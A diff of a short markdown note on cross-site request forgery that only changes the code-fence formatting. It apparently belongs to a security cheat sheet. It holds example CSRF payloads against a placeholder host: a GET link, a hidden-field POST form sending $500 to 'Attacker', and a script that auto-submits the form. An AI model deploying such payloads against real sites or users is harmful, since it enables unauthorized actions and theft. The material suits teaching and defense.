@@ -3,10 +3,11 @@
 CSRF is an attack vector that allows an attacker to get the users to perform actions that they do not intend to perform. 
 
 ### Get Request
-`html
-<a href="http://site.com/send?to=Attacker&amount=$500">Click me!</a>`
+`
+<a href="http://site.com/send?to=Attacker&amount=$500">Click me!</a>
+`
 ### Post Request
-`html
+`
 	<form action="http://site.com/send" method="POST">
      <input type="hidden" name="to" value="Attacker"/>
      <input type="hidden" name="amount" value="$500"/>
@@ -14,7 +15,7 @@ CSRF is an attack vector that allows an attacker to get the users to perform act
    </form>
 `
 To perform an automatic submit:
-`html
+`
    <script>
     	document.forms[0].submit();
    </script>
